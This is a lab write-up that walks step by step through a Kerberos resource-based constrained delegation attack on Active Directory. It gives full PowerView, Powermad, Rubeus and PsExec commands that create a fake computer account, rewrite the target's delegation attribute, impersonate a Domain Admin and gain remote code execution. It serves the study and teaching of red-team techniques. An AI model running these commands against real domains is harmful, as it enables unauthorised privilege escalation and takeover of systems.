# Kerberos Resource-based Constrained Delegation: Computer Object Take Over

It's possible to gain code execution with elevated privileges on a computer if you have WRITE privilege on that computer's AD object.

High level overview of the attack:

* We have code execution on the box `WS02` in the context of offense\sandy user
* User sandy has `WRITE` privilege over a target computer `WS01`
* User sandy creates a new computer object `FAKE01` in Active Directory \(no admin required\)
* Sandy leverages `WRITE` privilege on the `WS01` computer object and updates computer object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means - the target computer `WS01` is happy for the computer resource `FAKE01` to impersonate any domain user if they want to access anything on `WS01`
* `WS01` trusts `FAKE01` \(due to the modified `msDS-AllowedToActOnBehalfOfOtherIdentity`\)
* We request kerberos tickets for `FAKE01$` with ability to impersonate `offense\spotless` who is a Domain Admin
* Profit

This lab is based on a video presented by [@wald0](https://twitter.com/_wald0?lang=en) - [https://www.youtube.com/watch?v=RUbADHcBLKg&feature=youtu.be](https://www.youtube.com/watch?v=RUbADHcBLKg&feature=youtu.be)

## Requirements

|  |  |
| :--- | :--- |
| Target computer | WS01 |
| Admins on target computer | spotless@offense.local |
| Fake computer name | FAKE01 |
| Fake computer SID | To be retrieved during attack |
| Fake computer password | 123456 |
| Windows 2012 Domain Controller | DC01 |

Since the attack will entail creating a new computer object on the domain, let's check if users are allowed to do it - by default, a domain member usually can add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`

```csharp
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-20-49-58.png)

The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:

```csharp
Get-DomainController
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-20-56-15.png)

Last thing to check - target computer WS01 object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:

```text
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-03-32.png)

This is the attribute the above command is referring to:

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-08-47.png)

## Creating a new Computer Object

Let's now create a new computer object for our computer `FAKE01` \(as referenced earlier in the requirements table\) - this is the computer that will be trusted by our target computer later on:

```csharp
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-21-30-46.png)

Checking if the computer got created and noting its SID:

```csharp
Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-25-11.png)

Create a new raw security descriptor for the `FAKE01` computer principal:

```csharp
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-26-41.png)

## Modifying Target Computer's AD Object

Applying the security descriptor bytes to the target `WS01` machine:

```csharp
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-38-54.png)

Reminder - we were able to write this because `offense\Sandy` belongs to security group `offense\Operations`, which has full control over the target computer `WS01$` although the only important one/enough is the `WRITE` privilege:



![](../../.gitbook/assets/screenshot-from-2019-03-26-22-40-43.png)

If our user did not have the required privileges, you could infer that from the verbose error message:

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-43-25.png)

Once the `msDS-AllowedToActOnBehalfOfOtherIdentitity` is set, it is visible here:

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-42-18.png)

Same can be seen this way:

```csharp
Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-41-34.png)

We can test if the security descriptor assigned to computer ws01 in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the fake01$ machine:

```csharp
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the `fake01$` machine's SID - exactly what we want it to be:

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-24-04.png)

## Execution

### Generating RC4 Hash

Let's generate the RC4 hash of the password we set for the `FAKE01` computer:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-22-46-25.png)

### Impersonation

Once we have the hash, we can now attempt to execute the attack by requesting a kerberos ticket for fake01$ with ability to impersonate user spotless who is a Domain Admin:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
```

![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-45.png)

Unfortunately, in my labs, I was not able to replicate the attack even though according to the output of rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system `ws01`:

![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-57%20%281%29.png)

Once again, checking kerberos tickets on the system showed that I had a ticket for spotless, but the attack still did not work:

![](../../.gitbook/assets/screenshot-from-2019-03-28-22-01-23.png)

### Endless Trial and Error

Talking to a couple of folks who had successfully simulated this attack in their labs, we still could not figure out what the issue was. After repeating the the attack over and over and carrying out various other troubleshooting steps, I finally found what the issue was.

Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of `ws01`:

![](../../.gitbook/assets/screenshot-from-2019-03-31-13-16-17.png)

Note, howerver if we request a ticket for SPN `cifs/ws01` - we can now access C$ share of the `ws01` which means we have admin rights on the target system WS01:

```csharp
\\VBOXSVR\Tools\Rubeus\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt
```

![](../../.gitbook/assets/screenshot-from-2019-03-31-13-31-17.png)

To further prove we have admin rights - we can write a simple file from ws02 to ws01 in c:\users\administrator:

![](../../.gitbook/assets/screenshot-from-2019-03-31-13-36-35.png)

Additionally, check if we can remotely execute code with our noisy friend psexec:

```csharp
\\vboxsvr\tools\PsExec.exe \\ws01 cmd
```

![](../../.gitbook/assets/screenshot-from-2019-03-31-13-44-20.png)

{% hint style="warning" %}
Note that the `offense\spotless` rights are effective only on the target system - i.e on the system that delegated another computer resource to act on the target's behalf and impersonate domain users.
{% endhint %}

## References

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}

{% embed url="https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/" %}

{% embed url="https://decoder.cloud/2019/03/20/donkeys-guide-to-resource-based-constrained-delegation-from-standard-user-to-da/" %}









